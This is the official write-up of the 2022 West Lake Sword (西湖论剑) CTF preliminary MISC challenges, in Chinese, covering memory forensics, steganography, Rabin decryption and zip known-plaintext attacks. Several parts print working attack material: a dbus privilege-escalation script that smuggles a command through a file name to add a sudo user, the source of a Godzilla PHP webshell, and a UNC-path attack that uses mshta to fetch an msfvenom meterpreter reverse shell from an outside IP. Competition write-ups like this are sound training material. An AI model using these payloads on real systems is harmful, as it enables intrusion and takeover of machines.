# MISC｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write Up
![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/bda640de-5aa7-48b2-bb0a-3ce1d2a6698a.jpeg?raw=true)

2023年2月2日，第六届西湖论剑网络安全技能大赛初赛落下帷幕！来自全国**30****6所**高校、**485支**战队、**2733人**集结线上初赛！  

8小时激战，**22次**一血争夺！战队比拼互不相让，比赛如火如荼！

为帮助各位选手更好的复盘，组委会特别发布本届大赛初赛的官方Write Up供大家学习和交流！

**以下为本届西湖论剑大赛初赛MISC题目的Write Up**

**MISC**

**2022西湖论剑大赛官方WP**

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/6ad5cc2c-c937-4625-a8df-6ece2b86330c.gif?raw=true)

**（一）**

**Isolated Machine Memory Analysis**

1、使用volatility对题目附件进行常规的基本分析，可以得知系统上运行有mstsc.exe进程，即题目提及的远程连接，需要设法获取远程服务器有关信息；

2、注意到题目附件为ELF core dump格式，资料查阅可知VirtualBox生成的虚拟机ELF core dump包含VRAM等额外信息1；

3、从题目附件提取VRAM内容，还原为图像（观察数据可知4字节为一单位，从数据长度粗略估计分辨率），可以得到虚拟机桌面，其上有远程连接窗口。其中的Python IDLE窗口展示了加密flag的方式（类似RSA）及数值，聊天窗口提示加密公钥可能从聊天窗口复制得到；

4、使用volatility检查题目附件的剪切板内容，可以得到加密公钥；

5、检查公钥参数可以发现其公开模数N较短（512位）且可使用factordb查询得到私钥参数P与Q2；

6、注意到指数E为2，与RSA不符但符合Rabin密码特征。编写Rabin解密脚本，代入P、Q与加密flag，解密得到的四条明文中包含flag。

**注：** 第3步提取图像时应注意每像素的第四字节应忽略**3**（参见下述提取脚本），若作为Alpha解析将导致图像中部分信息丢失。

提取VRAM还原图像的脚本如下：

```
#!/usr/bin/env python3import io# pip install Pillowfrom PIL import Image# $ volatility vboxinfo# ...# FileOffset       Memory Offset    Size#              ...              ...        ...#       0xdffcda2c       0xe0000000  0x2000000#              ...              ...        ...# Bit-depth & resolution needs some observation on extracted data and make educated guesses.# Alternatively, resolution can be found by Screenshot pluginimg = Image.new('RGB', (1440, 900))img_data = img.load()with open('CharlieBrown-PC.elf', 'rb') as f: f.seek(0xdffcda2c, io.SEEK_SET) for y in range(900):  for x in range(1440):   data = list(f.read(4)[ : 3]) # BGRx   data[0], data[2] = data[2], data[0]   img_data[x, y] = tuple(data)img.save('screen.png')
```

最终解密脚本如下：

```
#!/usr/bin/env python3# pip install pycryptodomefrom Crypto.Util.number import bytes_to_long, long_to_bytes# Extended Euclid Algorithm, eqv. to gmpy2.gcdext()def gcdext(a: int, b: int) -> tuple[int, int, int]: x0, x1 = 1, 0 y0, y1 = 0, 1  while b > 0:  q = a // b  a, b = b, a % b    x0, x1 = x1, x0 - x1 * q  y0, y1 = y1, y0 - y1 * q  return a, x0, y0# From the public key extracted from the clipboardn = 6761456110411637567688581808417563265129495172728559363264959694161676396727177452588827048488546653264235848263182009106217734439508352645687684489830161# Via factordbp = 79346858353882639199177956883793426898254263343390015030885061293456810296567q = 85213910804835068776008762162103815863113854646656693711835550035527059235383# From VRAM screenshotc = bytes_to_long(bytes.fromhex('089ebf3622f6f6d498c1b5ecfe4d831d3e876bf55578586389127e0053bb4fe006e2eee5398b86274fdce0418d16c9bb0bf24922cec491b3047d33eb661784c9'))mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)_, yp, yq = gcdext(p, q)m1 = (yp * p * mq + yq * q * mp) % nm2 = n - m1m3 = (yp * p * mq - yq * q * mp) % nm4 = n - m3print('flag1\t=', long_to_bytes(m1))print('flag2\t=', long_to_bytes(m2))print('flag3\t=', long_to_bytes(m3))print('flag4\t=', long_to_bytes(m4))
```

**（二）**

**机你太美**

1、首先看见是npbk文件，用可知夜神模拟器的设备，导入

2、导入后开机，发现有密码，使用adbshell连接，执行rm /data/system/locksettings.db ，随后重启，即可绕过开机密码

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/f45bfdad-91b8-4fe3-9572-d82115286f74.png?raw=true)

3、简单看了眼相册，并没什么有用的，发现一个Skred聊天工具，比较可疑，打开看看

4、发现聊天记录，通过浏览可以发现他传了一堆压缩包，均有密码，且内容都是flag，常规爆破行不通

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/1bd4b6bc-f545-4af8-94d9-1f7d7ba072c1.png?raw=true)

5、结尾说明两张图片有用，猜测藏了一些隐写信息

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/81a13e46-ccc5-4e9d-b58f-447f50a57197.png?raw=true)

6、第二张图片通过使用在线exif发现了隐藏信息

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/050db569-e339-436d-ae19-80ebc17feeea.png?raw=true)

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/3bcd026b-9f79-45cd-86c2-10a413f82c80.png?raw=true)

7、暂时不知道有什么用，看看另一张，通过010发现本质是个png，尝试用stegsolve进行查看

8、在a2通道发现异样

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/88680027-b839-42f0-a1ad-f37c35ec2b1d.png?raw=true)

9、写脚本提取

```
from PIL import Imageimg = Image.open('1.png')a, b = img.sizeflag = ''for x in range(a):    for y in range(b):        pixel = img.getpixel((x, y))        if x == 400:            r, g, b, alpha = pixel            if alpha == 251:                flag += '0'            elif alpha == 255:                flag += '1'            print(flag)
```

10、然后获得内容cyberchef转一下，获得了一串key

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/0e13f8e9-0933-4132-aa08-ad26e4896439.png?raw=true)

11、通过聊天记录可知他最后补发了一份，那么尝试用该串解密他补发的内容

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/5153cb19-2160-4fce-9142-d1fe5094e772.png?raw=true)

12、内容乱码，结合之前获得的XOR信息，异或一下即可获得flag

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/861f4b53-1913-43a5-a6c8-79579c77629f.png?raw=true)

**（三）**

**KP-Basic**

1、打开是这样一个界面，可以对指定的 IP 地址发起 ping。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/ffbe0951-8208-41ca-949e-45eb917fe24b.png?raw=true)

2、抓取请求，注入命令，反弹 Shell。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/478fdc34-eb64-4683-9afb-2e9bb978b8ae.png?raw=true)

3、尝试执行自定义脚本，未果，推测有拦截。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/79b43b40-5732-4a4f-85ae-89e213e7cf5c.png?raw=true)

4、则尝试用 dbus 提权，审计 Kylin-Update-Manager 的源码，可以发现这个漏洞https://www.cnvd.org.cn/flaw/show/CNVD-2022-78421 还没修。

则 spawn 一个终端出来。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/69d3065a-792e-4918-9f8d-600f88c4d748.png?raw=true)

python3 执行下面的脚本。

```
from pathlib import Pathimport dbusimport base64from pathlib import Pathcommand = "adduser fakeadmin && adduser fakeadmin sudo && echo 'fakeadmin:Bb123***'|chpasswd"command_base64 = base64.b64encode(command.encode()).decode()path = '/tmp/`echo ' + command_base64 + '|base64 -d|sh`'Path(path).touch()bus = dbus.SystemBus()remote_object = bus.get_object("cn.kylinos.KylinUpdateManager", "/cn/kylinos/KylinUpdateManager")remote_object.install_snap(path, dbus_interface="cn.kylinos.KylinUpdateManager")print("Command executed!")
```

直接全部粘进去让它执行。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/4f10a557-a316-488b-96f9-dd652f2e8ee8.png?raw=true)

5、接下来就可以 su fakeadmin, 然后就可以用 Bb123*** 这个密码登录，然后就可以sudo su 提权到root。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/b3d32a38-7a7a-4bc3-8dd3-c6100d328590.png?raw=true)

然后就可以修改 glzjin 的密码了。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/74214e10-5e3e-40b6-b047-2a12d0d4f127.png?raw=true)

6、然后接下来切换到 glzjin 用户，启动 vncserver。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/6a004815-340b-412c-82cb-b5295e941552.png?raw=true)

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/db4dc35d-f443-4dad-943c-3db9a26f9eff.png?raw=true)

7、然后开启文件保险箱，初始化失败。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/d58c0ff1-95c5-482f-9e6a-ff403bc505ac.png?raw=true)

8、需要想办法把vncserver的父进程id挂到当前系统登录的session里，可以用快捷方式+开机启动项操作。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/c1d2fe53-2092-4195-baf4-cda576fe4a71.png?raw=true)

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/fb83bb17-4744-47b8-9661-e7d07f1c3aea.png?raw=true)

9、重启，再连接，即可打开文件保险箱。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/d96048ae-5e9c-4d37-9783-68767dc1a521.png?raw=true)

10、使用rockyou.txt 密码尝试，尝试到大概三百个左右时 “maganda” 这个密码可行，打开即可看到flag。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/0fa32d34-8d1d-4962-8ae6-179d5321bf80.png?raw=true)

**（四）**

**mp3**

1、下载附件得到一个mp3文件，播放一下没有什么特殊声音。先用winhex打开，发现文件尾后面藏了一个png图片

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/2d3cabaa-77c6-42db-a05f-344b65c3edf7.png?raw=true)

2、先将png图片提取出来，得到：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/30f0f428-3dc8-440d-99f0-697a35da33cd.png?raw=true)

3、图片比较规整，只有0和255两种颜色，怀疑图片的黑色和白色转0和1，写一个脚本跑一下，发现是压缩包，提取脚本如下：

```
from PIL import Imageimport structpic = Image.open('cipher.png')a, b = pic.sizefp = open('flag.zip', 'wb')flag = ''for y in range(b):    for x in range(a):        flag += str(pic.getpixel((x, y))//255)for i in range(0, len(flag), 8):    fp.write(struct.pack('B', int(flag[i:i+8], 2)))fp.close()
```

跑一下脚本得到一个加密的压缩包文件

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/9d1ba448-a0b3-4f50-b2d1-4d8ed7bbff58.png?raw=true)

4、此时缺一个压缩包的password，附件是一个mp3文件，但此时还没有用到mp3相关的隐写，尝试一下，最后可以发现是mp3stego，该隐写方式需要密码，但我们在解题过程中并没有获得过密码，尝试空密码解密，发现解密成功

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/09d135d7-42df-47e9-8b77-266ea2cae4a2.png?raw=true)

5、解密成功后得到：

```
8750d5109208213f
```

尝试解密压缩包，解密成功，得到47.txt

```
2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
```

6、根据标题47.txt，怀疑是rot47，尝试解密，得到：

```
a=~[];a={___:++a,aaaa:(![]+"")[a],__a:++a,a_a_:(![]+"")[a],_a_:++a,a_aa:({}+"")[a],aa_a:(a[a]+"")[a],_aa:++a,aaa_:(!""+"")[a],a__:++a,a_a:++a,aa__:({}+"")[a],aa_:++a,aaa:++a,a___:++a,a__a:++a};a.a_=(a.a_=a+"")[a.a_a]+(a._a=a.a_[a.__a])+(a.aa=(a.a+"")[a.__a])+((!a)+"")[a._aa]+(a.__=a.a_[a.aa_])+(a.a=(!""+"")[a.__a])+(a._=(!""+"")[a._a_])+a.a_[a.a_a]+a.__+a._a+a.a;a.aa=a.a+(!""+"")[a._aa]+a.__+a._+a.a+a.aa;a.a=(a.___)[a.a_][a.a_];a.a(a.a(a.aa+"\""+a.a_a_+(![]+"")[a._a_]+a.aaa_+"\\"+a.__a+a.aa_+a._a_+a.__+"(\\\"\\"+a.__a+a.___+a.a__+"\\"+a.__a+a.___+a.__a+"\\"+a.__a+a._a_+a._aa+"\\"+a.__a+a.___+a._aa+"\\"+a.__a+a._a_+a.a__+"\\"+a.__a+a.___+a.aa_+"{"+a.aaaa+a.a___+a.___+a.a__a+a.aaa+a._a_+a.a_a+a.aaa+a.aa_a+a.aa_+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a_+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.__a+a.a_a+a.aa__+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+"}\\\"\\"+a.a__+a.___+");"+"\"")())();
```

该形式非常类似jjencode，但是jjencode多为$，而这里是大量的a。但实则没有区别，只是换了一个字符而已。直接放到浏览器控制台内运行，即可得到flag：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/6c3baf6a-5a17-484f-8a3d-83451c3ecf4d.png?raw=true)

`**DASCTF{f8097257d699d7fdba7e97a15c4f94b4}**  
`

**（五）**

**take\_the\_zip_easy**

首先拿到附件为 zipeasy.zip，压缩包里面有俩文件，一个 dasflow.pcapng，一个是 dasflow.zip，猜测 dasflow.zip 就是 dasflow.pcapng 被压缩后的压缩包。那么 dasflow.zip 这个压缩包中偏移固定 30 字节的位置处必定是 `dasflow.pcapng`。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/6f2c137b-5624-46d4-9f37-d7a2f303ada9.png?raw=true)

而当一个加密压缩包中存在另一个 zip 压缩包时，我们又猜测出了该压缩包内的文件名称时，就可以尝试使用已知明文攻击。

看一下加密方式，dasflow.zip 是 ZipCrypto Store 加密的，正好符合。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/f19f9dc2-9891-474a-92a6-84189a1fd2f3.png?raw=true)

尝试攻击：

```
md5sum zipeasy.zipecho -n "dasflow.pcapng" | hextime ./bkcrack -C zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304 > 1.log &tail -f 1.log
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/d3cecd1b-e63c-4483-8137-c35a7f4604b2.png?raw=true)

image-20221106202354479

得到的 3 个 key 为：

```
2b7d78f3 0ebcabad a069728c
```

提取出 dasflow.zip：

```
./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/c41bd238-cdf0-45c0-a233-cb27f02ad4bf.png?raw=true)

当然也可直接借助 ARCHPR 的“口令来自密钥”功能进行恢复得到解密后的流量包

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/01b787a1-907b-4d9f-8856-2a2594613d6c.png?raw=true)

追踪一下 POST 数据流，发现上传了 eval.php 文件，很明显的 Godzilla 特征：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/68a5147b-a01d-4ad0-80a2-618320dc4a68.png?raw=true)

代码如下：

```
<?php@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){    for($i=0;$i<strlen($D);$i++) {        $c = $K[$i+1&15];        $D[$i] = $D[$i]^$c;    }    return $D;}$pass='air123';$payloadName='payload';$key='d8ea7326e6ec5916';if (isset($_POST[$pass])){    $data=encode(base64_decode($_POST[$pass]),$key);    if (isset($_SESSION[$payloadName])){        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,"getBasicsInfo")===false){            $payload=encode($payload,$key);        }  eval($payload);        echo substr(md5($pass.$key),0,16);        echo base64_encode(encode(@run($data),$key));        echo substr(md5($pass.$key),16);    }else{        if (strpos($data,"getBasicsInfo")!==false){            $_SESSION[$payloadName]=encode($data,$key);        }    }}
```

由于后续所有的流量都经过了该 webshell 进行混淆，所以需要进行解密：

```
<?phpfunction encode($D,$K){    for($i=0;$i<strlen($D);$i++) {        $c = $K[$i+1&15];        $D[$i] = $D[$i]^$c;    }    return $D;}// $pass='air123';$key='d8ea7326e6ec5916';$a = 'ca19adef3b7a8ce7J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZkb2e56eb02f8c2a4d';$b = substr($a, 16, strlen($a)-32);echo gzdecode(encode(base64_decode($b), $key));// uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

由于需要解密的流量太多，这里通过 `文件->导出对象->HTTP` 导出所有文件：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/ccb4095e-e35e-4e14-a0ce-8426996f41e3.png?raw=true)

发现 flag.zip，发现需要密码，猜测隐藏在其他响应包内容里，这里批量进行解密：

```
from urllib.parse import unquoteimport gzip, base64, redef encode(D, K):    res = b''    for i in range(len(D)):        c = K[i+1&15]        res += bytes.fromhex(hex(D[i]^ord(c))[2:].zfill(2))    return res# pass='air123'key='d8ea7326e6ec5916'for i in range(1,28):    with open(f'aaa/eval({i}).php', 'r') as f:        data = unquote(f.read())        if 'air123' in data:            try:                data = re.findall(r'air123=(.*)', data)[0]                print(f'eval({i}).php - request:')                print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))            except:                pass        # else:        #     try:        #         data = data[16:-16]        #         print(f'eval({i}).php - request:')        #         print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))        #     except:        #         pass
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/d7cfea26-714b-44a3-98f3-af5525bea7b5.png?raw=true)

通过批量解密拿到密码 `airDAS1231qaSW@`，解压之前从流量包中提取出来的 flag.zip 拿到最终 flag。

**（六）**

**TryToExec**

  

1、打开靶机，是这样一个界面，可以执行 ping 和 tracert。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/39501807-f374-4ec8-8e41-f042702a8c98.png?raw=true)

从命令返回看是 Windows 系统。

2、抓包，发现这个接口。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/a6e72f63-aabd-4609-b422-04e8426d2d4b.png?raw=true)

是 Python 写的。

请求 /api?action=whoami，发现返回OK。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/1bc88925-349a-48ae-a5f5-f38eab472d2d.png?raw=true)

3、推测后端为 os.subprocess(\[action, 'www.zhaoj.in'\])，可执行文件名可控，结合其为 Windows，可以尝试用 UNC 路径进行攻击。

在自己的VPS上开一个 smb 服务器。

```
docker run -it -p 139:139 -p 445:445 -v /tmp:/share -d dperson/samba -s "public;/share"
```

然后在 /tmp 下创建一个 1.bat。

```
curl http://162.14.79.59:9988
```

给其赋予执行权限。

```
chmod 777 1.bat
```

然后监听端口

```
nc -lvnvp 9988
```

访问 /api?action=\\162.14.79.59\\public\\1.bat, 就可以看到有请求弹回来了。

**4、先生成下 MSF 马。** 

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=162.14.121.186 LPORT=4444 -f hta-psh > shell.hta
```

然后对外放出来。

```
python3 -m http.server 9866
```

1.bat 改成如下。

```
mshta http://162.14.121.186:9866/shell.hta
```

MSF监听开着。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/93b213e3-4585-47f7-9293-f5093238fd53.png?raw=true)

然后访问 /api?action=\\162.14.79.59\\public\\1.bat。

即可收到回弹。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/535d055b-a8fa-4ebe-80b5-13dcd81f18b7.png?raw=true)

download C:\\Th3Th1nsUW4nt.docx ./ 即可拿到flag文件。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/71890f07-ee0c-4783-ab4c-433f4766aadb.png?raw=true)

